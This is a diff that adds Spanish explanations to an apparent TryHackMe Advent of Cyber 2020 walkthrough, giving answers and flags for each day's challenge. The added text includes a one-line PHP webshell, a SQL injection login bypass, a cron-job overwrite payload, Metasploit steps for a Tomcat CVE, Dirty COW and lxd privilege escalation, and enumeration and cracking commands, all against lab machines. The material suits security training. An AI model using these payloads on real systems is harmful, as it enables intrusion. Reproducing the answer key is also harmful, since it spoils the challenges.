@@ -17,11 +17,15 @@
 
 ### Task 1: Introducción
 
+**Explicación:** Presentación de la edición 2020 del Advent of Cyber: 24 días de tareas diarias con teoría, vídeo y minilaboratorio. La narrativa sigue a McSkidy y los duendes contra el Grinch. Solo lectura informativa.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Lee la introducción del evento y comienza. | `No answer needed` |
 
 ### Task 2: Preparación del entorno
+
+**Explicación:** Se configura el entorno de trabajo: elegir entre la AttackBox (Kali remota web) o la VPN con máquina propia, y verificar conectividad con el laboratorio. Tarea de configuración sin respuestas.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -31,11 +35,15 @@
 
 ### Task 3: Bienvenida al evento
 
+**Explicación:** Presentación formal del evento y de la comunidad: cómo se resuelven las tareas diarias y dónde encontrar ayuda. Solo lectura y continuar con la historia.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Continúa con la historia del evento. | `No answer needed` |
 
 ### Task 4: Cómo jugar
+
+**Explicación:** Explicación del formato: cada día publica una tarea con sus preguntas y respuestas exigidas de forma exacta, con máquinas desplegables. Solo lectura del formato.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -43,11 +51,15 @@
 
 ### Task 5: Vídeo de apertura
 
+**Explicación:** Vídeo introductorio que contextualiza el evento y los objetivos del calendario de adviento. Solo visualización.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Visualiza el vídeo de apertura. | `No answer needed` |
 
 ### Task 6: Día 1 - Autenticación (cookies)
+
+**Explicación:** La aplicación guarda la sesión en la cookie `auth`, cuyo valor está en hexadecimal. Decodificándola (hex→ASCII) se obtiene un objeto JSON con `company` y `username`. La cookie de Santa es `7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d`. Cambiando `username` a `santa` se activa la línea de la fábrica y aparece la flag `THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}`. Lección: las codificaciones reversibles (hex/base64/JSON) no son seguridad.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -60,6 +72,14 @@
 
 ### Task 7: Día 2 - Subida de archivos
 
+**Explicación:** Añadiendo `?id=ODIzODI5MTNiYmYw` a la URL se llega a la página de subida. El sitio solo valida de forma débil (dice que acepta `Image`), así que se sube una webshell PHP disfrazada que se guarda en `/uploads/`:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Visitando `http://MACHINE_IP/uploads/shell.php?cmd=cat /var/www/flag.txt` se lee la flag `THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}`. Lección: validar tipo (magic bytes + extensión + contenido) en las subidas.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Qué cadena de texto hay que añadir a la URL para acceder a la página de subida? | `?id=ODIzODI5MTNiYmYw` |
@@ -70,12 +90,21 @@
 
 ### Task 8: Día 3 - Descubriendo credenciales
 
+**Explicación:** Laboratorio guiado de ataque de autenticación: capturar el tráfico del login o leer cómo se construye la petición revela las credenciales en claro. Al completar el ataque se obtiene la flag `THM{885ffab980e049847516f9d8fe99ad1a}`. Lección: credenciales que viajan sin proteger son interceptables en la red o en el código de la aplicación.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Realiza el ataque de autenticación indicado en el laboratorio. | `No answer needed` |
 | 2 | ¿Cuál es la flag? | `THM{885ffab980e049847516f9d8fe99ad1a}` |
 
 ### Task 9: Día 4 - Enumeración web y fuzzing
+
+**Explicación:** Fuzzing de directorios y parámetros. La teoría usa wfuzz (`-c` color, `-z file,big.txt` lista y `FUZZ` la posición); para la URL de ejemplo sería `wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ`. Contra la máquina, GoBuster revela `site-log.php` en el directorio de la API, y fuzzeando su parámetro `date` el post correcto devuelve `THM{D4t3_AP1}`. Lección: la enumeración descubre rutas y parámetros ocultos.
+
+```bash
+gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt
+wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt http://MACHINE_IP/api/site-log.php?date=FUZZ
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -85,6 +114,8 @@
 | 4 | Fuzzea el parámetro "date" del archivo encontrado en el directorio de la API. ¿Qué flag muestra el post correcto? | `THM{D4t3_AP1}` |
 
 ### Task 10: Día 5 - Inyección SQL en el panel de Santa
+
+**Explicación:** Sin fuerza bruta (mirando el código fuente o enlaces), se localiza el panel `/santapanel`. Inyectando `' OR 1=1 -- -` en el login se bypasea. Dentro hay `22` regalos; Paul pidió `Github Ownership`; la flag es `thmfox{All_I_Want_for_Christmas_Is_You}` y la contraseña de admin `EhCNSWzzFP6sc7gB`. Lección: las consultas SQL concatenadas permiten alterar la lógica de autenticación.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -97,6 +128,12 @@
 
 ### Task 11: Día 6 - Cross-Site Scripting (XSS)
 
+**Explicación:** El foro renderiza el contenido sin sanear → XSS almacenado al inyectar `<script>`; la cadena de búsqueda `q` también se refleja → XSS reflejado. Con ZAP (`zaproxy`) un escaneo automatizado reporta `2` alertas XSS, y después se explota manualmente. Lección: validar y escapar el contenido antes de renderizarlo.
+
+```bash
+zaproxy
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Explora el foro y localiza el fallo de inyección. | `No answer needed` |
@@ -108,6 +145,8 @@
 
 ### Task 12: Día 7 - Análisis de tráfico (Wireshark)
 
+**Explicación:** Wireshark sobre dos PCAPs. En `pcap1.pcap` el ping inicial parte de `10.11.3.2`; el filtro `http.request.method == GET` muestra que `10.10.67.199` visitó `reindeer-of-the-week`. En `pcap2.pcap`, siguiendo el flujo FTP, la contraseña en claro es `plaintext_password_fiasco`, y el resto de la sesión es `SSH` (cifrada). La curiosidad final: McSkidy quiere un `Rubber ducky`. Lección: filtrar tráfico y seguir streams para localizar credenciales.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Abre "pcap1.pcap" en Wireshark. ¿Qué dirección IP inicia el ping/ICMP? | `10.11.3.2` |
@@ -118,6 +157,13 @@
 | 6 | ¿Qué quiere Elf McSkidy para sustituir a Elf McEager? | `Rubber ducky` |
 
 ### Task 13: Día 8 - Snort y Nmap
+
+**Explicación:** Snort (IDS creado en `1998`) y Nmap. El escaneo muestra servicios en los puertos `80,2222,3389`; con `-O` la distribución reportada es `Ubuntu`; con el script `http-title` el título indica que la web es un `Blog`:
+
+```bash
+nmap -sV -O MACHINE_IP
+nmap --script http-title MACHINE_IP
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -131,6 +177,13 @@
 
 ### Task 14: Día 9 - FTP anónimo
 
+**Explicación:** El FTP permite el usuario anónimo. En el directorio `public` vive `backup.sh`, ejecutado por un cron. Santa tiene en su lista `The Polar Express`. Sobrescribiendo `backup.sh` con un payload se consigue el contenido de `/root/flag.txt`: `THM{even_you_can_be_santa}`. Lección: FTP abierto + cronjobs = ejecución de comandos.
+
+```bash
+#!/bin/bash
+cat /root/flag.txt > /home/ftpuser/public/flag.txt
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cómo se llama el directorio del servidor FTP con datos accesibles por el usuario "anonymous"? | `public` |
@@ -140,6 +193,13 @@
 
 ### Task 15: Día 10 - Samba
 
+**Explicación:** Enumeración SMB con enum4linux: `3` usuarios y `4` shares. Con smbclient se comprueba que el share `tbfc-santa` no pide contraseña, y dentro está la carpeta `jingle-tunes` que McSkidy dejó para Santa. Lección: shares SMB sin protección exponen recursos internos.
+
+```bash
+enum4linux -a MACHINE_IP
+smbclient //MACHINE_IP/tbfc-santa
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Usando enum4linux, ¿cuántos usuarios hay en el servidor Samba (MACHINE_IP)? | `3` |
@@ -148,6 +208,13 @@
 | 4 | Entra en ese share. ¿Qué directorio dejó ElfMcSkidy para Santa? | `jingle-tunes` |
 
 ### Task 16: Día 11 - Escalada de privilegios (sudo)
+
+**Explicación:** Escalada vertical: un usuario normal ejecuta comandos como root. Comprobando con `sudo -l` qué se permite y ejecutándolo, se lee `/root/flag.txt`: `thm{2fb10afe933296592}`. El archivo `sudoers` define estos privilegios. Lección: revisar siempre los derechos sudo concedidos.
+
+```bash
+sudo -l
+sudo cat /root/flag.txt
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -159,6 +226,16 @@
 
 ### Task 17: Día 12 - Apache Tomcat (Metasploit)
 
+**Explicación:** Tomcat `9.0.17` vulnerable al CVE-2019-0232 (CGI Servlet → RCE). Con Metasploit se gana una sesión Meterpreter, se lee `flag1.txt` (`thm{whacking_all_the_elves}`) y se escala a root. Lección: versiones exactas de middleware → buscar su CVE.
+
+```bash
+msfconsole
+use exploit/multi/http/tomcat_jsp_upload_bypass
+set RHOSTS MACHINE_IP
+set LHOST tun0
+run
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es el número de versión del servidor web? | `9.0.17` |
@@ -168,6 +245,8 @@
 | 5 | Escala a root y completa el reto. | `No answer needed` |
 
 ### Task 18: Día 13 - Escalada de privilegios (Dirty COW)
+
+**Explicación:** Máquina Ubuntu `12.04` con `telnet` (protocolo obsoleto). Login con `clauschristmas`. El kernel es vulnerable a Dirty COW (CVE-2016-5195). Se compila con `gcc -pthread dirty.c -o dirty -lcrypt`, se ejecuta, se crea el usuario `firefart` con contraseña propia y se obtiene root; la salida termina mostrando el hash MD5 `8b16f00dd3b51efadb02c1df7f8427cc`. El contenido original del mensaje del usuario es `grinch`. Lección: kernels viejos sin parche = RCE local trivial.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -185,6 +264,8 @@
 
 ### Task 19: Día 14 - OSINT (Ho-Ho-Hosint)
 
+**Explicación:** OSINT sobre el usuario de Reddit `IGuidetheClaus2020`. Su historial de comentarios está en `/user/IGuidetheClaus2020/comments`; menciona Chicago (nacimiento), a Robert May (creador de Rudolph), usa Twitter con el mismo handle, sigue el Bachelorette, participó en el desfile de Chicago, y las fotos EXIF dan coordenadas `41.891815, -87.624277` con la flag `{FLAG}ALWAYSCHECKTHEEXIFD4T4`. En haveibeenpwned su contraseña filtrada es `spygame`, y el cruce ubica el hotel en el `540`. Lección: OSINT cruzando redes sociales, EXIF y brechas de datos.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Qué URL te lleva directamente al historial de comentarios de Reddit de Rudolph? | `https://www.reddit.com/user/IGuidetheClaus2020/comments` |
@@ -201,6 +282,8 @@
 
 ### Task 20: Día 15 - Python
 
+**Explicación:** Mini-lección de Python: `True + True` → `2`; `bool("False")` → `True` (cadena no vacía); `PyPi` es el índice de paquetes; `Requests` descarga HTML. El programa de la pregunta 5 devuelve `[1, 2, 3, 6]` porque las listas se pasan por referencia (`Pass by reference`) y la lista se muta aunque se reasigne dentro de la función.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es la salida de True + True? | `2` |
@@ -212,6 +295,12 @@
 
 ### Task 21: Día 16 - API del trineo de Santa
 
+**Explicación:** Sin herramientas de enumeración (inspeccionando la web) se halla la API en `/api/` en el puerto `80`. Un endpoint indica que Santa está en `Winter Wonderland, Hyde Park, London`. La API key es un impar entre 0 y 100; probando con curl (con cuidado de no bloquear el servicio) se encuentra `57`. Lección: probar endpoints y valores de bajo rango para autenticaciones débiles.
+
+```bash
+curl "http://MACHINE_IP/api/findlocation.php?apikey=57"
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es el número de puerto del servidor web? | `80` |
@@ -221,6 +310,8 @@
 
 ### Task 22: Día 17 - Ingeniería inversa (Ghidra)
 
+**Explicación:** Con Ghidra se sigue un binario: la primera `movl` asigna `1` a `local_ch`; la `imull` multiplica `eax` (que vale `6`); y antes del `xor` que pone `eax` a 0, `local_4h` vale `6`. Lección: leer el flujo de instrucciones (mov → imul → mov → xor) para deducir valores.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es el valor de local_ch cuando se llama a la instrucción movl correspondiente (la primera si hay varias)? | `1` |
@@ -228,6 +319,12 @@
 | 3 | ¿Cuál es el valor de local_4h antes de que eax se ponga a 0? | `6` |
 
 ### Task 23: Día 18 - Crackeo de contraseñas
+
+**Explicación:** Se extrae un hash y se crackea con una wordlist; la contraseña de Santa es `santapassword321`. Al iniciar sesión con ella, la web muestra la flag `thm{046af}`. Lección: hashes sin salt + contraseñas débiles se recuperan en segundos.
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -237,12 +334,16 @@
 
 ### Task 24: Día 19 - Explotación web (Naughty List)
 
+**Explicación:** La "Naughty List" usa una frase como contraseña de Santa: `Be good for goodness sake!`. Entrando con ella se obtiene `THM{EVERYONE_GETS_PRESENTS}`. Lección: frases como secretos y credenciales hardcodeadas en el front-end son triviales de explotar si se entiende la mecánica del sitio.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es la contraseña de Santa? | `Be good for goodness sake!` |
 | 2 | ¿Cuál es la flag del reto? | `THM{EVERYONE_GETS_PRESENTS}` |
 
 ### Task 25: Día 20 - Windows Forensics (los Elfos)
+
+**Explicación:** Forense Windows: el Elfo 1 (archivo oculto en Documents) quiere `2 front teeth`; el Elfo 2 (carpeta oculta en el escritorio) quiere la película `Scrooged`; el Elfo 3 está en la carpeta oculta `3lfthr3e` de C:\Windows con dos archivos: el primero tiene `9999` palabras y las de los índices 551 y 6991 son `Red Ryder`; buscando esa frase en el segundo archivo, el Elfo 3 quiere un `Red Ryder BB Gun`. Lección: activar "mostrar archivos ocultos" y analizar contenido de texto en triage forense.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -255,6 +356,8 @@
 
 ### Task 26: Día 21 - Windows Forensics (hashes y strings)
 
+**Explicación:** En Documents: el hash de `db.exe` es `596690FFC54AB6101932856E6A78E3A1` y el del ejecutable misterioso `5F037501FB542AD2D9B06EB12AED09F0`. Con `strings64` sobre este último se localiza la flag oculta `THM{f6187e6cbeb1214139ef313e108cb6f9}`, y ejecutando el conector db.exe se imprime `THM{3088731ddc7b9fdeccaed982b07c297c}`. Lección: hashes para identificar muestras y strings para extraer información incrustada.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Lee el archivo de texto de la carpeta Documents. ¿Cuál es el hash del archivo db.exe? | `596690FFC54AB6101932856E6A78E3A1` |
@@ -263,6 +366,8 @@
 | 4 | ¿Qué flag se muestra al ejecutar el conector de la base de datos? | `THM{3088731ddc7b9fdeccaed982b07c297c}` |
 
 ### Task 27: Día 22 - KeePass
+
+**Explicación:** La base KeePass se abre con `thegrinchwashere`. Los valores de la columna password están codificados en `Base64` (campo 'Matching ops'). Decodificando: el Elf Server usa `sn0wM4n!` y ElfMail `ic3Skating!`. En esta edición la tarea solo pide usar los datos obtenidos (no hay pregunta de flag). Lección: contraseñas puestas en base64 dentro del gestor equivalen a contraseñas en claro.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -273,6 +378,8 @@
 | 5 | Sigue los pasos para usar los datos obtenidos. | `No answer needed` |
 
 ### Task 28: Día 23 - Ransomware (Windows Forensics)
+
+**Explicación:** La nota de rescate esconde una "dirección bitcoin" que descifrada da `nomorebestfestivalcompany`; los archivos cifrados cambian a `.grinch`; la tarea programada sospechosa es `opidsfsdf` que ejecuta `C:\users\administrator\desktop\opidsfsdf.exe`; otra tarea limpió los VSS con ID `7a9eea15-0000-0000-0000-010000000000`; montando la partición oculta aparece `Confidential` y con 'Previous Versions' se restaura el archivo cuya contraseña es `m33pa55w0rdIZseecure!`. Lección: los VSS/versiones previas son clave en respuestas a ransomware.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -285,6 +392,8 @@
 | 7 | Usa la pestaña 'Previous Versions' para restaurar el archivo cifrado. ¿Cuál es la contraseña dentro del archivo? | `m33pa55w0rdIZseecure!` |
 
 ### Task 29: Día 24 - TRON (web + Docker)
+
+**Explicación:** Máquina final: puertos `80, 65000`, web oculta titulada `Light Cycle`. GoBuster revela `uploads.php` y la carpeta `grid` de subidas. Se sube webshell → `web.txt` = `THM{ENTER_THE_GRID}`. La config del servidor web da `tron:IFightForTheUsers`; la BD `tron` guarda credenciales cifradas que crackeadas dan `@computer@`; SSH como `tron` → `user.txt` = `THM{IDENTITY_DISC_RECOGNISED}`. El usuario está en el grupo `lxd`, que permite montar el host desde un contenedor y leer `root.txt` = `THM{FLYNN_LIVES}`. Lección: acceso al grupo lxd = root.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -305,6 +414,8 @@
 | 15 | ¿Cuál es el valor de la flag root.txt? | `THM{FLYNN_LIVES}` |
 
 ### Task 30: Conclusión
+
+**Explicación:** Cierre del evento: Fred, el administrador del trineo, pide el resumen. La flag de reconocimiento es `thm{thank_you_2020}`; después solo queda ver el vídeo final y completar la encuesta del evento.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
